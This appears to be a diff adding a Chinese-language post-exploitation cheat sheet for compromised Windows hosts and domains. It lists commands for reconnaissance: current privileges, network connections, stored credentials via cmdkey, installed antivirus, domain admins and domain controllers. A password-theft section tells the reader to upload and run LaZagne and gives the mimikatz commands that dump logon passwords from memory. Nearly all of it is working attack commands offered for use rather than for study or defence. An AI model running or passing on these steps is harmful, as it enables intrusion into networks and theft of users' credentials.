@@ -1,0 +1,95 @@
+查看当前权限
+
+whoami && whoami /priv
+
+查看ip
+
+ipconfig /all
+
+查看系统信息
+
+systeminfo
+
+查看网络连接
+
+netstat -ano
+
+查看安装应用
+
+
+wmic product get name,version
+
+查看进程
+
+tasklist /v
+net start                          ------ 查看当前运行的服务
+
+查看远程连接信息
+
+cmdkey /l
+
+
+查看杀软
+
+WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
+
+查看在线用户
+
+quser
+
+查看密码复杂策略
+
+net accounts                       ------  查看本地密码策略
+net accounts /domain               ------  查看域密码策略
+
+查看当前系统版本
+
+wmic OS get Caption,CSDVersion,OSArchitecture,Version
+
+查看本机管理员
+
+net localgroup administrators
+net localgroup administrators /domain 登录本机的域管理员
+
+查看当前登录域
+
+net config workstation
+
+查看域用户
+
+net user /domain
+
+查看域管理员的用户组
+
+
+net group "domain admins" /domain
+
+查看域控制器
+
+net group "domain controllers" /domain
+
+查看域机器
+
+net group "domain computers" /domain
+
+获取域控ip
+
+ping -a 域控计算机名
+
+取密码
+
+
+
+取本机密码有几种方式
+
+从注册表里读取，从内存读取，读取浏览器保存的密码，读取vpn保存的密码，读取配置文件保存的密码
+
+上传lazagne
+
+lazagne.exe all
+
+mimikatz读取密码如下：
+
+　　privilege::debug
+
+　　sekurlsa::logonpasswords
